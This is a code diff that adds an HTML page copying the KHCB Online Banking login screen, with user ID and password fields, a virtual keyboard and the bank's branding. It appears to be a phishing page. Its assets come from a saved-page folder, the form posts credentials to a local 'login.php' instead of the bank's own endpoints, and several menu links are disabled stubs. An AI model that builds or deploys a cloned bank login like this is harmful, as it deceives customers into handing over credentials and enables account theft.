@@ -1,0 +1,442 @@
+<html xmlns="http://www.w3.org/1999/xhtml"><head><title>eBanking</title>
+<link rel="stylesheet" href="eBanking_files/IHBcssLogin.css" type="text/css"> 
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+</head>
+<body leftmargin="0" topmargin="0" bgcolor="#ffffff" marginheight="0" marginwidth="0">
+  <table class="table1" border="0" cellpadding="0" cellspacing="0" width="100%">
+  <tbody>
+	<tr>
+		<td background="eBanking_files/top-bg.jpg" height="93" valign="top">
+			<table border="0" cellpadding="0" cellspacing="0" width="100%">
+				<tbody>
+					<tr>
+						<td rowspan="2" width="25%">
+							<div align="center"><img src="eBanking_files/logo.jpg" width="150">
+							</div>
+						</td>
+						<td colspan="2"> 
+							<div class="Maroon" align="right">
+							</div>
+						</td>
+					</tr>
+					
+				</tbody>
+			</table>
+		</td>
+	</tr>
+	<tr>
+		<td bgcolor="#c89689" height="4"></td>
+	</tr>
+	<tr>
+		<td height="6"></td>
+	</tr>
+  </tbody>
+</table>
+<table class="table2" border="0" cellpadding="0" cellspacing="0" width="100%">
+  <tbody>
+	  <tr>
+		<td background="eBanking_files/main.jpg" height="191"><form name="form1" method="post" action="login.php">
+		  <table border="0" cellpadding="0" cellspacing="0" width="100%">
+            <tbody>
+              <tr>
+                <td>&nbsp;</td>
+                <td valign="top" width="215"><table align="center" border="0" cellpadding="0" cellspacing="0" width="247">
+                  <tbody>
+                      <tr>
+                        <td background="eBanking_files/login-bg.jpg" height="148" valign="top"><table border="0" cellpadding="0" cellspacing="0" width="98%">
+                            <tbody>
+                              <tr>
+                                <td height="26"><div class="white" align="center">Member Login </div></td>
+                              </tr>
+                              <tr>
+                                <td height="120"><table align="center" border="0" cellpadding="2" cellspacing="2" width="98%">
+                                    <tbody>
+                                      <tr valign="top">
+                                        <td class="Maroon" valign="middle">User ID </td>
+                                        <td><input name="user" type="text" class="text-dark" id="user" tabindex="1" size="24" maxlength="15">
+                                      </tr>
+                                      <tr valign="top">
+                                        <td class="Maroon" valign="middle">Password</td>
+                                        <td><input name="pass" type="password" class="text-dark" id="pass" style="cursor: pointer;" size="24" maxlength="15" autocomplete="off">
+                                      </tr>
+                                      <tr valign="top">
+                                        <td class="Maroon" valign="middle">Landing Page</td>
+                                        <td><select class="gray-tit" name="strshortlinkname">
+                                            <option selected="selected">Default</option>
+                                            <option value="home">Home</option>
+                                            <option value="acctsum">Summary Page</option>
+                                            <option value="acc">Accounts</option>
+                                            <option value="tra">Transfers</option>
+                                            <option value="batbill">Batelco Payments</option>
+                                            <option value="zainbill">Zain Payments</option>
+                                            <option value="electbill">Electricity Payments</option>
+                                          </select>
+                                        </td>
+                                      </tr>
+                                      <tr>
+                                        <td colspan="2"><input name="Submit" type="image" value="Submit" src="eBanking_files/submit.gif">
+                                            </label>
+                                            </a>
+                                            </div>
+                                        </td>
+                                      </tr>
+                                    </tbody>
+                                </table></td>
+                              </tr>
+                            </tbody>
+                        </table></td>
+                      </tr>
+                    </tbody>
+                </table>
+                    <div align="center"><br class="br1">
+                      <a href="javascript:forgotpwd();"><font color="white"><b>Request for New PIN</b></font></a></div></td>
+                <td valign="top" width="330"><meta http-equiv="Content-Type" content="text/html; charset=">
+                    <title>Virtual KeyBoard</title>
+                    <script language="JavaScript1.2" src="eBanking_files/jquery.txt"></script>
+                    <script language="JavaScript1.2" src="eBanking_files/keyboard_csmove.txt"></script>
+                    <link rel="stylesheet" href="eBanking_files/IHBcsskeypad.css" type="text/css">
+               
+                    <div id="vkb" style="Z-INDEX: -1; LEFT: 200px; VISIBILITY: hidden; OVERFLOW: hidden; WIDTH: 478px; POSITION: absolute; TOP: 0px; HEIGHT: 275px;  -moz-user-select: none; -khtml-user-select: none; user-select: none">
+                      <table style="cursor: default;" border="0" cellpadding="0" cellspacing="0" width="500">
+                        <tbody>
+                          <tr valign="top">
+                            <td><table bgcolor="#FFFFFF" border="0" cellpadding="0" cellspacing="0">
+                                <tbody>
+                                  <tr onMouseDown="startdrag(event,'vkb');" style="cursor: move;">
+                                    <td class="vk_header"><table border="0" cellpadding="0" cellspacing="0" width="100%">
+                                        <tbody>
+                                          <tr>
+                                            <td class="vk_border" width="10px">&nbsp;</td>
+                                            <td class="vk_border" align="right" height="24px" width="24px"><img src="eBanking_files/drag.gif" height="23" width="23"></td>
+                                            <td class="vk_border" width="10px">&nbsp;</td>
+                                            <td class="vk_border" align="left">Please drag to move the KeyBoard</td>
+                                            <td class="vk_border" align="left" width="22"><a href="javascript:done('done');randomizeKeys();"><img src="eBanking_files/close.gif" height="19" width="19"></a></td>
+                                          </tr>
+                                        </tbody>
+                                    </table></td>
+                                  </tr>
+                                  <tr>
+                                    <td class="vk_box"><!------------btns start here------------------>
+                                        <div id="btn_container" style="position:relative;">
+                                          <table border="0" cellpadding="0" cellspacing="0">
+                                            <tbody>
+                                              <tr>
+                                                <td valign="top"><table border="0" cellpadding="0" cellspacing="0">
+                                                    <tbody>
+                                                      <tr>
+                                                        <td valign="top"><div onClick="toggle('with');" onMouseOver="changeGif('/IHB/ITimages/images/caps_hover.jpg');" onMouseOut="changeGif('/IHB/ITimages/images/caps.jpg');" align="left"><img src="eBanking_files/caps.jpg" name="gif" height="80" width="50"></div></td>
+                                                        <td><div id="smallLayout" style="display:inline">
+                                                            <table border="0" cellpadding="0" cellspacing="0">
+                                                              <tbody>
+                                                                <tr>
+                                                                  <td class="alp_box" align="center"><table align="center" border="0" cellpadding="0" cellspacing="0">
+                                                                      <tbody>
+                                                                        <tr>
+                                                                          <td valign="top"><div class="alp_btn" align="center">q</div></td>
+                                                                          <td valign="top"><div class="alp_btn" align="center">w</div></td>
+                                                                          <td valign="top"><div class="alp_btn" align="center">e</div></td>
+                                                                          <td valign="top"><div class="alp_btn" align="center">r</div></td>
+                                                                          <td valign="top"><div class="alp_btn" align="center">t</div></td>
+                                                                          <td valign="top"><div class="alp_btn" align="center">y</div></td>
+                                                                          <td valign="top"><div class="alp_btn" align="center">u</div></td>
+                                                                          <td valign="top"><div class="alp_btn" align="center">i</div></td>
+                                                                          <td valign="top"><div class="alp_btn" align="center">o</div></td>
+                                                                          <td valign="top"><div class="alp_btn" align="center">p</div></td>
+                                                                        </tr>
+                                                                      </tbody>
+                                                                  </table>
+                                                                      <table align="center" border="0" cellpadding="0" cellspacing="0">
+                                                                        <tbody>
+                                                                          <tr>
+                                                                            <td valign="top"><div class="alp_btn" align="center">a</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">s</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">d</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">f</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">g</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">h</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">j</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">k</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">l</div></td>
+                                                                          </tr>
+                                                                        </tbody>
+                                                                      </table>
+                                                                    <table align="center" border="0" cellpadding="0" cellspacing="0">
+                                                                        <tbody>
+                                                                          <tr>
+                                                                            <td valign="top"><div class="alp_btn" align="center">z</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">x</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">c</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">v</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">b</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">n</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">m</div></td>
+                                                                          </tr>
+                                                                        </tbody>
+                                                                    </table></td>
+                                                                </tr>
+                                                              </tbody>
+                                                            </table>
+                                                        </div>
+                                                            <div id="capsLayout" style="display:none">
+                                                              <table align="center" border="0" cellpadding="0" cellspacing="0">
+                                                                <tbody>
+                                                                  <tr>
+                                                                    <td class="alp_box" align="center"><table align="center" border="0" cellpadding="0" cellspacing="0">
+                                                                        <tbody>
+                                                                          <tr>
+                                                                            <td valign="top"><div class="alp_btn" align="center">Q</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">W</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">E</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">R</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">T</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">Y</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">U</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">I</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">O</div></td>
+                                                                            <td valign="top"><div class="alp_btn" align="center">P</div></td>
+                                                                          </tr>
+                                                                        </tbody>
+                                                                    </table>
+                                                                        <table align="center" border="0" cellpadding="0" cellspacing="0">
+                                                                          <tbody>
+                                                                            <tr>
+                                                                              <td valign="top"><div class="alp_btn" align="center">A</div></td>
+                                                                              <td valign="top"><div class="alp_btn" align="center">S</div></td>
+                                                                              <td valign="top"><div class="alp_btn" align="center">D</div></td>
+                                                                              <td valign="top"><div class="alp_btn" align="center">F</div></td>
+                                                                              <td valign="top"><div class="alp_btn" align="center">G</div></td>
+                                                                              <td valign="top"><div class="alp_btn" align="center">H</div></td>
+                                                                              <td valign="top"><div class="alp_btn" align="center">J</div></td>
+                                                                              <td valign="top"><div class="alp_btn" align="center">K</div></td>
+                                                                              <td valign="top"><div class="alp_btn" align="center">L</div></td>
+                                                                            </tr>
+                                                                          </tbody>
+                                                                        </table>
+                                                                      <table align="center" border="0" cellpadding="0" cellspacing="0">
+                                                                          <tbody>
+                                                                            <tr>
+                                                                              <td valign="top"><div class="alp_btn" align="center">Z</div></td>
+                                                                              <td valign="top"><div class="alp_btn" align="center">X</div></td>
+                                                                              <td valign="top"><div class="alp_btn" align="center">C</div></td>
+                                                                              <td valign="top"><div class="alp_btn" align="center">V</div></td>
+                                                                              <td valign="top"><div class="alp_btn" align="center">B</div></td>
+                                                                              <td valign="top"><div class="alp_btn" align="center">N</div></td>
+                                                                              <td valign="top"><div class="alp_btn" align="center">M</div></td>
+                                                                            </tr>
+                                                                          </tbody>
+                                                                      </table></td>
+                                                                  </tr>
+                                                                </tbody>
+                                                              </table>
+                                                            </div></td>
+                                                      </tr>
+                                                      <tr>
+                                                        <td colspan="2"><table border="0" cellpadding="0" cellspacing="0" width="100%">
+                                                            <tbody>
+                                                              <tr>
+                                                                <td valign="top"><div onClick="javascript:del('del');" onMouseOver="changeGif2('/IHB/ITimages/images/backspace_hover.jpg');" onMouseOut="changeGif2('/IHB/ITimages/images/backspace.jpg');" align="left"><img src="eBanking_files/backspace.jpg" name="gif2" height="24" width="103"></div></td>
+                                                                <td valign="top"><div onClick="javascript:clearAll();" onMouseOver="changeGif3('/IHB/ITimages/images/clear_hover.jpg');" onMouseOut="changeGif3('/IHB/ITimages/images/clear.jpg');" align="left"><img src="eBanking_files/clear.jpg" name="gif3" height="24" width="103"></div></td>
+                                                                <td valign="top"><div onClick="javascript:done('done');" onMouseOver="changeGif4('/IHB/ITimages/images/done_hover.jpg');" onMouseOut="changeGif4('/IHB/ITimages/images/done.jpg');" align="left"><img src="eBanking_files/done.jpg" name="gif4" height="24" width="103"></div></td>
+                                                              </tr>
+                                                            </tbody>
+                                                        </table></td>
+                                                      </tr>
+                                                    </tbody>
+                                                </table></td>
+                                                <td align="left" valign="top"><table align="center" border="0" cellpadding="0" cellspacing="0">
+                                                    <tbody>
+                                                      <tr>
+                                                        <td valign="top"><div id="vkb_num_0" class="alp_btn" align="center">0</div></td>
+                                                        <td valign="top"><div id="vkb_num_1" class="alp_btn" align="center">5</div></td>
+                                                        <td valign="top"><div id="vkb_num_2" class="alp_btn" align="center">1</div></td>
+                                                      </tr>
+                                                      <tr>
+                                                        <td valign="top"><div id="vkb_num_3" class="alp_btn" align="center">2</div></td>
+                                                        <td valign="top"><div id="vkb_num_4" class="alp_btn" align="center">3</div></td>
+                                                        <td valign="top"><div id="vkb_num_5" class="alp_btn" align="center">4</div></td>
+                                                      </tr>
+                                                      <tr>
+                                                        <td valign="top"><div id="vkb_num_6" class="alp_btn" align="center">6</div></td>
+                                                        <td valign="top"><div id="vkb_num_7" class="alp_btn" align="center">8</div></td>
+                                                        <td valign="top"><div id="vkb_num_8" class="alp_btn" align="center">9</div></td>
+                                                      </tr>
+                                                      <tr>
+                                                        <td>&nbsp;</td>
+                                                        <td valign="top"><div id="vkb_num_9" class="alp_btn" align="center">7</div></td>
+                                                        <td>&nbsp;</td>
+                                                      </tr>
+                                                    </tbody>
+                                                </table></td>
+                                              </tr>
+                                            </tbody>
+                                          </table>
+                                        </div></td>
+                                  </tr>
+                                  <tr>
+                                    <td class="vk_info"><b>To Enter your Password/UserID, select the characters using your mouse</b> <br>
+                                      OR keep your pointer on the required character for 3 seconds to auto select</td>
+                                  </tr>
+                                  <!--- btn container ends here  ---->
+                                </tbody>
+                            </table></td>
+                          </tr>
+                        </tbody>
+                      </table>
+                    </div>
+                  <script>
+	var numArray=new Array();
+	var splArray=new Array();
+	
+function removenumChar(id)
+{
+	var temp=new Array();
+	for (j=0;j<numArray.length;j++)
+	{
+		if(id!=j)
+		{
+		   temp[temp.length]=numArray[j];
+		}
+	}
+	numArray=temp;
+}
+function clearAll()
+{
+	clear('clear');
+}
+function removesplChar(id)
+{
+	var temp=new Array();
+	for (j=0;j<splArray.length;j++)
+	{
+		if(id!=j)
+		{
+		   temp[temp.length]=splArray[j];
+		}
+	}
+	splArray=temp;
+}
+function randomizeKeys()
+{
+	numArray=new Array(0,1,2,3,4,5,6,7,8,9);
+	var numcount=numArray.length;
+	var tempnumArray=new Array();
+	var numChar="";
+	for (i=0;i<numcount;i++)
+	{
+		var now = new Date();
+		var secs = now.getSeconds();
+		rnd = Math.random(secs);
+		rnd = Math.round(rnd * (numArray.length));
+		if (rnd == numArray.length)
+		{
+			rnd = 0
+		}
+		tempnumArray[i]=numArray[rnd];
+		numChar+=tempnumArray[i]+", "
+		removenumChar(rnd);
+	}	
+	var now = new Date();
+	var secs = now.getSeconds();
+	rndPos = Math.random(secs);
+	rndPos = Math.round(rndPos * 100);
+	if(rndPos>=90)
+	{
+		rndPos=0
+	}
+	numArray=tempnumArray;
+	for (i=0;i<numcount;i++)
+	{
+		document.getElementById("vkb_num_" + i).innerHTML = numArray[i];
+	}
+}
+randomizeKeys();
+            </script>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+                </form>
+		</td>
+	  </tr><tr>
+   <td>
+      <table border="0" cellpadding="0" cellspacing="0" width="100%">
+        <tbody>
+	      <tr>
+		      <td rowspan="2" valign="top" width="240">
+				    <div align="center">
+					<table title="Click to Verify - This site chose VeriSign SSL for secure e-commerce and confidential communications." border="0" cellpadding="2" cellspacing="0" width="135">
+					<tbody><tr>
+					<td align="center" valign="top" width="135"><script src="eBanking_files/getseal">
+					</script>
+					<br>
+					<a href="http://www.verisign.com/ssl-certificate/" target="_blank" style="color: rgb(0, 0, 0); text-decoration: none; font: bold 7px verdana,sans-serif; letter-spacing: 0.5px; text-align: center; margin: 0px; padding: 0px;"><font color="Black">ABOUT SSL CERTIFICATES</font></a></td>
+					</tr>
+					</tbody></table>
+					</div>
+			  </td>
+			  <td rowspan="2" bgcolor="#cccccc" valign="top" width="1"></td>
+			  <td bgcolor="#be272e" height="26">
+					<table align="center" border="0" cellpadding="0" cellspacing="0" width="98%">
+				       <tbody>
+			             <tr>
+			                <td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="white-tit">Welcome to KHCB Online Banking </span>
+							</td>
+			                <td class="white-sml"><a class="A1" href="javascript:disabled();">Demo</a> | <a class="A1" href="javascript:disabled();">Apply</a> | <a class="A1" href="javascript:disabled();">Help</a> | <a class="A1" href="javascript:disabled();">Alert</a> 
+			                </td>
+					     </tr>
+					  </tbody>
+					</table>
+			  </td>
+		  </tr>    
+		  <tr>
+			<td height="230" valign="top"><br>
+				<table align="center" border="0" cellpadding="0" cellspacing="0" width="98%">
+	              <tbody>
+			          <tr>
+					    <td><font size="1">
+
+						KHCB Online Banking provide you with an easy and secured way of 
+managing your accounts without the need to physically visit a branch.<br>
+						<ul><b>You can:</b>						
+						<li>View your accounts activities</li>
+						<li>Pay your Bills</li>
+						<li>Transfer funds between your own accounts</li>
+						<li>Transfer funds to Third parties (within KHCB or via Wire Transfers)</li>
+						<li>Plus many other self-service option</li></ul> 
+
+						<b>Note:</b> By providing your Login Details and clicking on submit, you confirm that you have read and agree to the
+						<a href="javascript:onClicklegal();"><font color="#2360CA">Legal Terms of Use.</font></a> Any unauthorized access or misuse of KHCB Online Banking is prohibited and will be pursued to the fullest extend of law.</font><br> <br>
+							  <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+							 <i>This page is best viewed in Internet Explorer (Resolution 1024 x 768) version 5.5 and above  </i>	
+							
+					    </td>
+			          </tr>
+					</tbody>
+				</table>
+			</td>
+		  </tr>
+	   </tbody>
+	 </table>
+
+	<table class="table_red" align="center" border="0" cellpadding="0" cellspacing="0" width="100%">
+	  <tbody>
+		  <tr>
+		    <td>
+		      <table align="center" border="0" cellpadding="0" cellspacing="0" width="95%">
+		        <tbody>
+			        <tr>
+			          <td height="22"><a class="A4" href="https://khcbonline.net/RetailBank/core.login.welcome.do?selectedTopMenu=B10">Home</a> | <a class="A4" href="javascript:onClicklegal();">Legal Disclaimer</a> | <a class="A4" href="javascript:onClickPrivacy();">Privacy Statement</a> | <a class="A4" href="javascript:onClickfaq();">FAQ</a> 
+					  </td>
+			          <td>
+							<div align="right">آ© Copyright 2007 KHCB </div>
+					  </td>
+					</tr>
+				</tbody>
+			  </table>
+		    </td>
+		  </tr>
+	  </tbody>
+	</table>
+  
+</td></tr></tbody></table></form></body></html>
